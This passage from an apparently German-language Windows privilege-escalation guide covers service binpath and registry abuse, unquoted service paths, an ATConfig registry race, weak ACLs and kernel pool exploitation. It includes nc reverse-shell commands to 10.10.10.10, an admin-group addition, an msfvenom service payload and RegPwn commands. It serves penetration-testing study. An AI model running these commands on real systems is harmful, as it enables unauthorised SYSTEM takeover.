**Beachte, dass der Dienst upnphost von SSDPSRV abhängt, damit er funktioniert (für XP SP1)**

**Eine weitere Behelfslösung** für dieses Problem besteht darin, Folgendes auszuführen:

```
sc.exe config usosvc start= auto
```

### **Dienst-Binärpfad ändern**

Wenn die Gruppe „Authentifizierte Benutzer“ über **SERVICE_ALL_ACCESS** für einen Dienst verfügt, kann dessen ausführbare Binärdatei geändert werden. So ändern und starten Sie **sc**:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Dienst neu starten

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Berechtigungen können über verschiedene Berechtigungen erweitert werden:

- **SERVICE_CHANGE_CONFIG**: Ermöglicht die Neukonfiguration der Service-Binärdatei.
- **WRITE_DAC**: Ermöglicht die Neukonfiguration von Berechtigungen und damit das Ändern der Service-Konfiguration.
- **WRITE_OWNER**: Ermöglicht die Übernahme des Besitzes und die Neukonfiguration von Berechtigungen.
- **GENERIC_WRITE**: Übernimmt ebenfalls die Möglichkeit, Service-Konfigurationen zu ändern.
- **GENERIC_ALL**: Übernimmt ebenfalls die Möglichkeit, Service-Konfigurationen zu ändern.

Zur Erkennung und Ausnutzung dieser Schwachstelle kann _exploit/windows/local/service_permissions_ verwendet werden.

### Schwache Berechtigungen für Service-Binärdateien

Wenn ein Service als **`LocalSystem`**, **`LocalService`**, **`NetworkService`** oder als privilegiertes Domänenkonto ausgeführt wird, aber **Benutzer mit geringen Berechtigungen die Service-EXE oder deren übergeordneten Ordner ändern können**, lässt sich der Service häufig kapern, indem **die Binärdatei ersetzt und der Service neu gestartet wird**.

**Prüfe, ob du die von einem Service ausgeführte Binärdatei ändern kannst** oder ob du **Schreibberechtigungen für den Ordner hast**, in dem sich die Binärdatei befindet ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Du kannst mit **wmic** (nicht in system32) alle von einem Service ausgeführten Binärdateien abrufen und deine Berechtigungen mit **icacls** prüfen:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Du kannst auch **sc** und **icacls** verwenden:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

Achte auf gefährliche ACLs, die **`Everyone`**, **`BUILTIN\Users`** oder **`Authenticated Users`** gewährt wurden, insbesondere **`(F)`**, **`(M)`** oder **`(W)`** für die Service-Executable oder das Verzeichnis, in dem sie sich befindet. Ein praktischer Ablauf für den Missbrauch sieht so aus:<sup>[[27]](#references)</sup>

1. Ermittle das Service-Konto und den Pfad zur Executable mit `sc qc <service_name>`.
2. Prüfe mit `icacls <path>`, ob die Binärdatei beschreibbar ist.
3. Ersetze die Service-Binärdatei durch ein Payload oder eine gültige bösartige Service-Binärdatei.
4. Starte den Service mit `sc stop <service_name> && sc start <service_name>` neu (oder warte auf einen Neustart bzw. Service-Trigger).

Nützliche automatisierte Prüfungen:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Wenn der Dienst einem normalen Benutzer keinen Neustart erlaubt, prüfe, ob er beim Systemstart automatisch gestartet wird, eine Fehleraktion festgelegt ist, die ihn neu startet, oder ob die Anwendung, die ihn verwendet, ihn indirekt auslösen kann.

### Berechtigungen zum Ändern der Dienstregistrierung

Du solltest prüfen, ob du eine Dienstregistrierung ändern kannst.\
Du kannst deine **Berechtigungen** für eine **Dienstregistrierung** wie folgt **prüfen**:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Der ursprüngliche Berechtigungstest lautete:

Es sollte geprüft werden, ob **Authenticated Users** oder **NT AUTHORITY\INTERACTIVE** über `FullControl`-Berechtigungen verfügen. Falls ja, kann die vom Dienst ausgeführte Binärdatei geändert werden.

Prüfen Sie, ob **Authenticated Users** oder **NT AUTHORITY\INTERACTIVE** über Schreibberechtigungen für einen bestimmten Dienstschlüssel in der Registry verfügen. Ein ACL-Eintrag allein belegt keinen effektiven Zugriff: Verweigerungseinträge, das aktuelle Token und geerbte Berechtigungen sind ebenfalls relevant. Die Rechte für einen Registry-Schlüssel unterscheiden sich von den Rechten `SERVICE_CHANGE_CONFIG` und `SERVICE_START` für das Dienstobjekt. Für eine Rechteausweitung sind außerdem ein nutzbares Dienstkonfigurationsfeld, eine Möglichkeit zum Starten des Dienstes und eine privilegiertere Dienstidentität erforderlich. Siehe Microsofts Referenzen zu [Registry-Schlüsselrechten](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) und [Dienstzugriffsrechten](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

So ändern Sie den Pfad der ausgeführten Binärdatei:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Registry-Symlink-Race für beliebige HKLM-Wertschreibvorgänge (ATConfig)

Einige Windows-Barrierefreiheitsfunktionen erstellen benutzerspezifische **ATConfig**-Schlüssel, die später von einem **SYSTEM**-Prozess in einen HKLM-Sitzungsschlüssel kopiert werden. Eine Registry-**Symlink-Race** kann diesen privilegierten Schreibvorgang auf einen beliebigen HKLM-Pfad umleiten und so eine Primitive zum beliebigen Schreiben von **HKLM-Werten** bereitstellen.<sup>[[18]](#references)</sup>

Wichtige Speicherorte (Beispiel: Bildschirmtastatur `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` listet installierte Barrierefreiheitsfunktionen auf.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` speichert benutzergesteuerte Konfiguration.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` wird während der Anmeldung oder bei Übergängen zum sicheren Desktop erstellt und ist für den Benutzer beschreibbar.

Ablauf des Angriffs (CVE-2026-24291 / ATConfig):

1. Lege den **HKCU-ATConfig**-Wert fest, der von SYSTEM geschrieben werden soll.
2. Löse die Kopie für den sicheren Desktop aus (z. B. mit **LockWorkstation**), wodurch der AT-Broker-Ablauf gestartet wird.
3. **Gewinne die Race**, indem du eine **oplock** auf `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` setzt. Sobald die oplock ausgelöst wird, ersetze den **HKLM-Session-ATConfig**-Schlüssel durch einen **Registry-Link** auf ein geschütztes HKLM-Ziel.
4. SYSTEM schreibt den vom Angreifer gewählten Wert in den umgeleiteten HKLM-Pfad.

Sobald du beliebige HKLM-Werte schreiben kannst, kannst du durch Überschreiben von Dienstkonfigurationswerten zu LPE wechseln:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/Befehlszeile)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Wähle einen Dienst aus, den ein normaler Benutzer starten kann (z. B. **`msiserver`**), und löse ihn nach dem Schreibvorgang aus. **Hinweis:** Die öffentliche Exploit-Implementierung **sperrt die Workstation** als Teil der Race.

Beispieltools (RegPwn BOF / Standalone):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### AppendData/AddSubdirectory-Berechtigungen für die Service-Registry

Wenn Sie diese Berechtigung für eine Registry haben, bedeutet das, dass Sie **untergeordnete Registrys darunter erstellen können**. Bei Windows-Diensten reicht das aus, um **beliebigen Code auszuführen**:

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Wenn der Pfad zu einer ausführbaren Datei nicht in Anführungszeichen steht, versucht Windows, jedes Pfadende vor einem Leerzeichen auszuführen.

Bei dem Pfad _C:\Program Files\Some Folder\Service.exe_ versucht Windows beispielsweise, Folgendes auszuführen:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Liste alle nicht in Anführungszeichen eingeschlossenen Dienstpfade auf, ausgenommen jene, die zu integrierten Windows-Diensten gehören:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Sie können** diese Schwachstelle mit metasploit erkennen und exploiten: `exploit/windows/local/trusted\_service\_path` Sie können mit metasploit manuell eine Service-Binärdatei erstellen:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Wiederherstellungsaktionen

Windows ermöglicht es Benutzern, Aktionen festzulegen, die ausgeführt werden, wenn ein Dienst fehlschlägt. Diese Funktion kann so konfiguriert werden, dass sie auf eine Binärdatei verweist. Wenn diese Binärdatei ersetzt werden kann, ist möglicherweise eine Rechteausweitung möglich. Weitere Informationen finden Sie in der [offiziellen Dokumentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Ziele von Skripten geplanter Aufgaben

Prüfen Sie bei einer aktivierten Aufgabe, die `cmd.exe /c` mit einer `.bat`- oder `.cmd`-Datei ausführt, sowohl das im **Aktionsargument** angegebene Skript als auch `cmd.exe`. Dasselbe gilt für ein explizites Dateiargument eines Interpreters, beispielsweise PowerShell `-File`. Wenn eine geplante Batchdatei einen wörtlichen PowerShell-Aufruf mit `-File` enthält, prüfen Sie auch die ACL des referenzierten Skripts; Variablen, Bedingungen und Shell-Verkettungen müssen manuell nachverfolgt werden. Ein Skript oder übergeordnetes Verzeichnis, in das der Aufrufer schreiben kann, ist nur dann ein Hinweis auf kontoübergreifende Ausführung, wenn sich der konfigurierte Aufgabenprinzipal vom Aufrufer unterscheidet und die Aufgabe diese Aktion tatsächlich erreicht. Eine ACL, die nur das Anhängen von Inhalten erlaubt, kann bei Skripten relevant sein; ein vorheriges `exit` oder ein anderer Kontrollfluss kann angehängte Zeilen jedoch unerreichbar machen. Bestätigen Sie die effektiven ACLs, den [Ausführungskontext der Aufgabe](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), das Arbeitsverzeichnis, den Trigger und die Richtlinie zur Anwendungssteuerung, bevor Sie eine Rechteausweitung behaupten. Die Bestandsaufnahme sollte das Skript weder ändern noch die Aufgabe starten.

## Benannte Streams in zugänglichen Dateien

Unter NTFS kann eine lesbare Datei einen benannten `:$DATA`-Stream enthalten, dessen Inhalt in einer gewöhnlichen Verzeichnisauflistung nicht angezeigt wird. Prüfen Sie bei einer kleinen, relevanten Auswahl zugänglicher Sicherungs- oder Konfigurationsdateien zunächst die **Namen und Größen** der Streams, bevor Sie Inhalte öffnen. Windows stellt sie über [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams) und PowerShells [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item) bereit. Ein Streamname, der auf ein Geheimnis hindeutet, ist lediglich ein Hinweis. Prüfen Sie den effektiven Lesezugriff auf die Datei, die Unterstützung von Streams durch das Dateisystem, ob der Stream verwendbare Anmeldedaten enthält und für welches Konto diese tatsächlich gültig sind. Vermeiden Sie bei routinemäßigen Aufzählungen rekursive Stream-Scans und die Ausgabe von Stream-Inhalten.

## Eingaben für geplante Hilfsprogramme des Windows Driver Kit

Das optionale Windows Driver Kit enthält `StandaloneRunner.exe`, das die Dateien `command.txt`, `reboot.rsf` und eine Projektdatei `working\rsf.rsf` aus seinem Ausführungsverzeichnis verwenden kann. Eine geplante Aufgabe oder ein Dienst, der dieses Hilfsprogramm mit einem privilegierten Konto startet, kann Schreibzugriff mit geringen Rechten auf diese Eingaben in Befehlsausführung im Kontext dieses Kontos verwandeln, selbst wenn die ausführbare Datei des Hilfsprogramms geschützt ist. Bestätigen Sie, dass ein privilegierter Prozess diese Dateien verwendet und dass **beide** Begleitdateien erstellt oder geändert werden können; das Auffinden des Hilfsprogramms allein reicht nicht aus.

Prüfen Sie bei einer geplanten Aufgabe deren [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) sowie die ACLs der beiden Begleitdateipfade. Gibt die Aufgabe kein Arbeitsverzeichnis an, ist das Verzeichnis der ausführbaren Datei lediglich ein Hinweis, der überprüft werden muss, und kein Beweis dafür, wo die Aufgabe ihre Eingaben einliest. Auch die Voraussetzung für die Projektarbeitsdatei muss erfüllt sein. Prüfen Sie den tatsächlichen Aufgabenprinzipal, statt anzunehmen, dass die Aufgabe als SYSTEM ausgeführt wird.

## Anwendungen

### Installierte Anwendungen

Prüfen Sie die **Berechtigungen der Binärdateien** (möglicherweise können Sie eine davon überschreiben und Ihre Rechte ausweiten) sowie die **Ordner** ([DLL Hijacking](dll-hijacking/index.html)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Checkmk-Reparaturpfad für den Windows-Agenten

[CVE-2024-0670](https://checkmk.com/werk/16361) betrifft ältere Checkmk-Windows-Agenten, die Befehlsdateien in `C:\Windows\Temp` schrieben und bei einem fehlgeschlagenen Ersetzen anschließend eine bereits vorhandene, schreibgeschützte Datei ausführten. Der Anbieter behob das Problem in 2.1.0p40, 2.2.0p23, 2.3.0b1 und 2.4.0b1. Prüfen Sie den vollständigen installierten Patchstand und ob der betroffene Agent-Vorgang ausgeführt werden kann; eine Versionsangabe nur auf Zweigebene wie `2.1` reicht nicht aus, um eine Gefährdung festzustellen. Bei der Enumeration können Version, Dienststatus und Temp-Berechtigungen geprüft werden, ohne Dateien anzulegen oder Agent-Befehle auszulösen.

#### Überprüfung des ADSelfService-Plus-SAML-Dienstes

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) betraf ADSelfService Plus Build 6210 und älter; der Anbieter behob die Schwachstelle in Build 6211. Sie ist nur relevant, wenn SAML SSO **aktiviert ist oder war**. Ein installierter Produkteintrag oder Dienstpfad ist daher ein Hinweis, aber kein Beleg für eine Schwachstelle: Bestätigen Sie den genauen Build, den SAML-Konfigurationsverlauf, die Erreichbarkeit des Dienstes über das Netzwerk und das Konto, unter dem er ausgeführt wird. Die Codeausführung über den Dienst übernimmt die Berechtigungen dieses Kontos; eine Ausführung als SYSTEM setzt eine Instanz voraus, die als SYSTEM läuft. Eine lesbare Datei `OfflineBackup_*.ezip` im Backup-Verzeichnis des Produkts ist ein separater Hinweis auf ein verschlüsseltes Backup, aber kein Nachweis für verwendbare Anmeldedaten oder diese SAML-Schwachstelle. Notieren Sie bei der routinemäßigen Enumeration den Pfad und die Zugriffsrechte, ohne die Datei zu entpacken.

#### Grenzen zwischen Jenkins-Controller und Domänenkonten

Unterscheiden Sie auf einem Windows-Jenkins-Controller zwischen der Berechtigung, einen Job zu erstellen oder zu konfigurieren, und der Berechtigung, ihn zu starten: [Jenkins dokumentiert diese als getrennte Berechtigungen `Job/Create`, `Job/Configure` und `Job/Build`](https://www.jenkins.io/doc/book/security/access-control/permissions/). Ein konfigurierter Zeitplan oder ein Remote-Trigger kann einen weiteren Ausführungsweg bieten; bestätigen Sie jedoch, dass er aktiviert ist und der Build tatsächlich ausgeführt wird. Die Ausführung erfolgt mit der Identität des Controllers oder des ausgewählten Agents; gespeicherte Anmeldedaten sind nur verwendbar, wenn der Job auf deren Geltungsbereich zugreifen kann. Prüfen Sie außerdem den Zugriff auf Metadaten in `JENKINS_HOME`: Jenkins speichert Anmeldedaten und Verschlüsselungsschlüssel in `credentials.xml`, `secrets/hudson.util.Secret` und `secrets/master.key` ([Jenkins-Geheimnisspeicherung](https://www.jenkins.io/doc/developer/security/secrets/)). Allein das Vorhandensein dieser Dateien gibt kein Passwort preis. Prüfen Sie den **Lesezugriff auf die erforderlichen Dateien** sowie einen separaten Weg zur Wiederverwendung des Kontos, ohne Geheimnisse in gemeinsam genutzten Ausgaben offenzulegen. Hat dieses Konto ein Schreibrecht auf `scriptPath` eines AD-Benutzerobjekts, bestätigen Sie einen beschreibbaren Skriptpfad sowie einen tatsächlichen Anmelde- oder geplanten Prozess, der als Zielbenutzer ausgeführt wird, bevor Sie dies als kontoübergreifende Ausführung einstufen. Weitere Gruppensteuerung erfordert eine separate Überprüfung der effektiven AD-Rechte.

#### Identität eines selbst gehosteten Azure-Pipelines-Agents

Unterscheiden Sie bei einem Azure DevOps Server- oder Azure-Pipelines-Projekt zwischen der Berechtigung, eine Pipeline **zu erstellen oder zu bearbeiten**, und der Berechtigung, sie **in die Warteschlange zu stellen** und den ausgewählten Agent-Pool zu verwenden; [Microsoft dokumentiert Pipeline-Berechtigungen](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) und [Pool-Autorisierung](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops) getrennt. Wenn ein Konto mit geringeren Berechtigungen einen Skriptschritt einreichen und diese Pipeline auf einem selbst gehosteten Windows-Agent ausführen kann, wird der Schritt unter dem [konfigurierten Betriebssystemkonto des Agents](https://learn.microsoft.com/azure/devops/pipelines/agents/agents) ausgeführt. Überprüfen Sie die konkrete Pipeline, Branch- und Ressourcenbeschränkungen, den autorisierten Pool, einen ausführbaren Job und die Dienstidentität des Agents, bevor Sie einen Wechsel zwischen Benutzern oder zu SYSTEM behaupten. Ein installierter Agent, eine Projektrolle oder Schreibzugriff auf ein Repository sind allein nur Hinweise. Prüfen Sie Berechtigungen und lokale Dienstmetadaten, ohne bei der passiven Enumeration einen Build zu starten.

#### Microsoft Entra Connect Sync-Anmeldedaten

[Microsoft unterscheidet](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) zwischen dem **ADSync-Dienstkonto**, das den Synchronisierungsdienst ausführt und auf dessen SQL-Datenbank zugreift, und dem **AD DS-Connector-Konto**, dessen Verzeichnisberechtigungen von den konfigurierten Synchronisierungsfunktionen abhängen. Die Anmeldedaten des Connectors werden verschlüsselt in dieser Datenbank gespeichert; das Schlüsselmaterial wird [durch DPAPI unter dem ADSync-Dienstkonto geschützt](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Ein installierter Synchronisierungsdienst, eine Gruppe, deren Name auf lokale Administratorrechte hindeutet, oder alleiniger Einblick in die Datenbank belegen weder entschlüsselbare Anmeldedaten noch eine Rechteausweitung in der Domäne. Prüfen Sie separat die tatsächlichen Leseberechtigungen für die Datenbank, den Zugriff auf das Dienstkonto und den Schlüssel, das Installations- und SQL-Layout, die konfigurierte Connector-Identität sowie deren effektive AD-Berechtigungen. Die routinemäßige Enumeration sollte nur Dienst- und Zugriffsmetadaten anzeigen, nicht die gespeicherten Geheimnisse abfragen oder ausgeben.

#### Berechtigungen für Support-DLLs von Druckertreibern

Ein installierter Druckertreiber kann Support-DLLs unter `C:\ProgramData` ablegen und sie in einem privilegierteren Druckprozess laden. Prüfen Sie die ACLs des konkreten Treiberverzeichnisses und der DLLs einschließlich übergeordneter Verzeichnisse und Reparse Points, selbst wenn die WMI-Enumeration von Druckern verweigert wird. Beim [Problem mit dem Ricoh-Druckertreiber CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1) lautete der angegebene Pfad `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz`; [die ursprüngliche Veröffentlichung](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) beschreibt das Laden von DLLs durch `PrintIsolationHost.exe`. Eine beschreibbare ACL ist lediglich ein Hinweis: Prüfen Sie den effektiven Schreibzugriff unter Berücksichtigung verweigernder Einträge, ob der betreffende Treiber installiert ist und die Datei mit einer privilegierten Identität lädt, sowie ob der aktualisierte Treiber oder ein Sicherheitsprogramm des Anbieters die Installation behoben hat. Leiten Sie eine Schwachstelle nicht allein aus dem Verzeichnisnamen oder der Treiberversion ab.

### Schreibberechtigungen

Prüfen Sie, ob Sie eine Konfigurationsdatei so ändern können, dass eine spezielle Datei gelesen wird, oder eine Binärdatei ändern können, die von einem Administratorkonto ausgeführt wird (schedtasks).

Eine Möglichkeit, schwache Berechtigungen für Ordner und Dateien im System zu finden, ist Folgendes:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Notepad++ plugin autoload persistence/execution

Notepad++ lädt automatisch jede Plugin-DLL in seinen `plugins`-Unterordnern. Ist eine beschreibbare portable/Kopie-Installation vorhanden, führt das Ablegen eines schädlichen Plugins bei jedem Start automatisch Code in `notepad++.exe` aus (einschließlich aus `DllMain` und Plugin-Callbacks).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Beim Start ausführen

**Prüfe, ob du einen Registry-Eintrag oder eine Binärdatei überschreiben kannst, die von einem anderen Benutzer ausgeführt wird.**\
**Lies** die **folgende Seite**, um mehr über interessante **autoruns-Speicherorte zur Rechteausweitung** zu erfahren:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Treiber

Suche nach möglichen **seltsamen/verwundbaren Drittanbieter-Treibern**

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Wenn ein Treiber eine Primitive für beliebige Kernel-Lese-/Schreibzugriffe bereitstellt (häufig bei schlecht entworfenen IOCTL-Handlern), kannst du deine Berechtigungen erhöhen, indem du direkt aus dem Kernel-Speicher ein SYSTEM-Token stiehlst.<sup>[[13]](#references)</sup> Die Schritt-für-Schritt-Technik findest du hier:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

{{#ref}}
kernel-mode-file-access-check-bypass.md
{{#endref}}

Verwandte Inhalte zur Windows-Kernel-Exploitation:

{{#ref}}
../../binary-exploitation/windows-kernel-type-confusion-to-npfs-arbitrary-rw.md
{{#endref}}

Bei Race-Condition-Bugs, bei denen der verwundbare Aufruf einen vom Angreifer kontrollierten Object-Manager-Pfad öffnet, lässt sich das Zeitfenster von Mikrosekunden auf Dutzende Mikrosekunden vergrößern, indem die Suche gezielt verlangsamt wird (mit Komponenten maximaler Länge oder tief verschachtelten Verzeichnisketten):

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

#### UAFs in Cancel-safe Queues, Paged-Pool-Leaks und I/O-Ring-Pivots

Manche Windows-Kernel-LPE-Ketten lassen sich aus zwei für sich genommen schwachen Bugs aufbauen: einer **Lifetime-Race in einer Cancel-safe Queue**, die eine Request/CBD freigibt, während die Queue-Sperre noch gehalten wird, und einer **Offenlegung durch Freigabe der Sperre vor dem Kopieren**, bei der während `RtlCopyToUser` eine freigegebene Paged-Pool-Allokation geleakt wird.<sup>[[29]](#references)</sup>

Hinweise zu Audit und Exploitation:

- **Freigabe unter Sperre + anschließender Abbruch**: Suche nach einem Erfolgspfad mit **Acquire -> CompleteRequest/free -> Release** und einem Abbruchpfad mit **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo**. Wenn der Erfolgspfad `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` aufruft, bevor er die CBDQ/CSQ-Sperre freigibt, kann ein in `NtCancelIoFileEx -> IopCsqCancelRoutine` blockierter Thread später fortfahren und einen freigegebenen `PFLT_CALLBACK_DATA` an den Remove-Callback des Treibers übergeben.
- **Verwende eine gleich große, vom Angreifer kontrollierte Paged-Pool-Allokation wieder**, um das freigegebene Queue-Objekt zu ersetzen. `NPFS` Data Queue Entries sind nützlich, weil Payload und Größe kontrollierbar sind und sich später mit Pipe-Read-/Peek-Operationen prüfen lassen. Wenn das freigegebene Objekt Listeneinträge enthält, überschreibe sie mit einer **zyklischen Liste gefälschter Request-Nodes im User-Speicher**, sodass der Treiber wiederholt vom Angreifer definierte Request-Strukturen verarbeitet, statt am ursprünglichen Listenkopf anzuhalten.
- **Erweitere einen vorhersagbaren Schreibzugriff**: Wenn der gefälschte Request einen verschachtelten Context-Pointer umleitet, der für Bookkeeping-Schreibzugriffe verwendet wird (Zeitstempel / QPC / Refcount-nahe Felder), erhältst du möglicherweise einen **adressgesteuerten, aber nicht wertgesteuerten** Kernel-Schreibzugriff. Ziele in diesem Fall auf das **length/size**-Feld eines gesprühten Pool-Objekts statt auf einen abschließenden Code-/Daten-Pointer und durchsuche anschließend den Spray, bis das beschädigte Objekt einen **Out-of-Bounds-Read aus dem Paged Pool** ermöglicht.
- **Muster für ein Race-ausnutzbares Leak**: Jeder Systemaufruf der Form `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` ist ein vielversprechender Kandidat. Die Zuverlässigkeit steigt, wenn der Angreifer den kopierten Buffer vergrößern kann (zum Beispiel durch viele zusätzliche Listeneinträge/Ressourceneinträge, die die endgültige Allokationsgröße eines Serializers erhöhen). Dadurch dauert der Kopiervorgang länger und das Zeitfenster zum Ersetzen wird größer, ohne dass der Rechner zwangsläufig abstürzt.
- **Refill-Ziele mit vielen Pointern**: Registrierte Buffer-Arrays von Windows-**I/O ring** sind ausgezeichnete Leak-Ziele, weil ihre Paged-Pool-Größe vom Angreifer kontrolliert wird (`8 * regBufferCnt`) und jedes Element ein Kernel-Pointer auf einen `_IOP_MC_BUFFER_ENTRY` ist. Leake eines dieser Arrays, ermittle das umgebende `IORING_OBJECT` und beschädige anschließend **`RegBuffers`** und **`RegBuffersCount`**, sodass nachfolgende I/O-Ring-Operationen gefälschte Einträge des Angreifers verwenden und beliebige Kernel-Lese-/Schreibzugriffe ermöglichen. Wenn der einzige verfügbare Schreibzugriff ein stabiles Byte liefert (zum Beispiel aus `KUSER_SHARED_DATA+0x14`), verwende **überlappende, nicht ausgerichtete Schreibzugriffe**, um einen User-Pointer mit wiederholtem Bytewert wie `0x0101010101010101` zu erzeugen, mappe ihn mit `VirtualAlloc` und platziere das gefälschte registrierte Buffer-Array dort.<sup>[[30]](#references)</sup>

Nützliche Debugging-Indikatoren:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

